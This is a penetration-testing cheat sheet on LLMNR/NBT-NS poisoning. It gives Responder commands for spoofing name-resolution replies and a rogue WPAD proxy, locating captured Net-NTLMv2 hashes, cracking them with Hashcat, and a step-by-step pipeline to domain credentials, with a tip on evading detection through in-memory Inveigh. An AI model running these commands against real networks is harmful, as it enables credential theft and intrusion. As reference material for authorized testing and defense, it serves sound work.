# 🌐 LLMNR/NBT-NS Poisoning Cheat Sheet

> [!info] 🧠 What is LLMNR & NBT-NS?
> 
> Bash
> 
> ```
> Fallback name resolution components for Microsoft Windows systems
> ```
> 
> 💡 Used exclusively when standard DNS resolution fails:
> 
> - **LLMNR:** Link-Local Multicast Name Resolution (UDP 5355)
>     
> - **NBT-NS:** NetBIOS Name Service (UDP 137)
>     
> - **The Flaw:** Queries are broadcast to the local link; _ANY_ system can reply.
>     

> [!tip] 🕵️ The Poisoning Vector (MitM)
> 
> Bash
> 
> ```
> Spoof authoritative answers to redirect victim authentication traffic.
> ```
> 
> 💡 Act like:
> 
> - The missing server
>     
> - The requested printer
>     
> - The mistyped network share
>     
> 
> ✔ Capture Net-NTLM password hashes
> 
> ✔ Prepare tokens for downstream relay attacks

# ⚙️ Network Poisoning Framework

> [!info] 🔎 Verify Broadcast Traffic (Analyze Mode)
> 
> Bash
> 
> ```
> sudo responder -I ens224 -A
> ```
> 
> 💡 Safely listens as a "fly on the wall" to:
> 
> - Map active subnets passively
>     
> - Avoid sending poisoned packets
>     
> - Identify chatty local hosts before attacking
>     

> [!success] 🔥 Execute Active Poisoning & WPAD Spoofing
> 
> Bash
> 
> ```
> sudo responder -I ens224 -w -f
> ```
> 
> 💡 Intercepts queries actively:
> 
> - `-w`: Spawns a rogue WPAD proxy server to catch HTTP traffic
>     
> - `-f`: Fingerprints the victim machine's operating system version
>     

# 🌍 Hash Extraction & Logs

> [!info] 🔎 Locate Captured Network Hashes
> 
> Bash
> 
> ```
> ls /usr/share/responder/logs/
> ```
> 
> 💡 Hashes are automatically written to files by protocol:
> 
> - `SMB-NTLMv2-SSP-<CLIENT_IP>.txt`
>     
> - `HTTP-NTLMv2-<CLIENT_IP>.txt`
>     

> [!success] 🧾 Review Raw Net-NTLMv2 Material
> 
> Bash
> 
> ```
> cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.5.25.txt
> ```
> 
> 💡 Gives you the exact user token payload structured for cracking rigs.

# 🧪 Offline Cryptanalysis

> [!tip] 🌐 Crack Captured Hashes via Hashcat
> 
> Bash
> 
> ```
> hashcat -m 5600 target_hash.txt /usr/share/wordlists/rockyou.txt
> ```
> 
> 💡 Processing parameters:
> 
> - `-m 5600`: Force the **Net-NTLMv2** parsing mode
>     
> 
> ✔ Recovers cleartext passwords for initial domain footprints

> [!warning] ⚠️ Important Restriction
> 
> Bash
> 
> ```
> Net-NTLM hashes CANNOT be used for Pass-the-Hash (PtH)
> ```
> 
> 💡 If the password is too complex to crack, you must switch to **SMB Relaying**.

# 🛠️ Multi-Platform Tool Mapping

> [!important] 🧩 Choose the Correct Poisoner for the Environment
> 
> Bash
> 
> ```
> Match the tool backend to your current terminal access layer
> ```

|**Tool**|**Language**|**Execution Platform**|**Core Use Case**|
|---|---|---|---|
|**Responder**|Python|Linux (Kali/Parrot Host)|Standard automated multi-protocol local link poisoning.|
|**Inveigh**|C# / PowerShell|Windows Native Host|Execute in-memory on compromised assets to evade detection.|
|**Metasploit**|Ruby|Multi-Platform|Rapid modular testing (`spoof/llmnr/mDNS_response`).|

# 🧠 Poisoning Mindset

> [!quote] 🎯 The Core Attack Workflow
> 
> Bash
> 
> ```
> User Typo ──> DNS Failure ──> Local Broadcast ──> Rogue Reply ──> Hash Captured
> ```
> 
> 💡 Capitalize on human error to capture cryptographic material.

> [!warning] ⚠️ Operational Safety Rule
> 
> Bash
> 
> ```
> Jumping straight to live exploitation on legacy hosts
> ```
> 
> ❌ Can cause server instability
> 
> ❌ Crashes legacy production apps
> 
> ✔ Fix: Secure explicit **written client clearance** first.

> [!success] ✔ Operational Best Practice
> 
> Bash
> 
> ```
> Run Responder inside a background 'tmux' panel while performing active scans.
> ```

# ⚡ Real-World Attack Execution

> [!success] 🧠 Foothold Pipeline
> 
> Bash
> 
> ```
> 1. Clear local interface ports
> 2. Initialize Responder in background tmux session
> 3. Capture Net-NTLMv2 user hashes
> 4. Parse log directories
> 5. Launch Hashcat (Mode 5600)
> 6. Recover cleartext domain user credentials
> 7. Transition to credentialed AD enumeration
> ```
> 
> 💡 Turn local network broadcast noise into authenticated domain access.

# 🧩 Mental Model

> [!quote] 🎯 Think Like This
> 
> Bash
> 
> ```
> NETWORK TYPO → BROADCAST FLOOD → ROGUE INTERCEPTION → AUTOMATED AUTHENTICATION → HASH EXTRACED
> ```

> [!tip] 🚀 Pro Tips
> 
> - Check port availability before launching Responder
>     
> - Always check for disabled SMB Signing for easy relay potential
>     
> - Net-NTLMv2 hashes must be cracked; NTLM hashes can be passed
>     
> - Keep Responder running silently while focusing on password sprays
>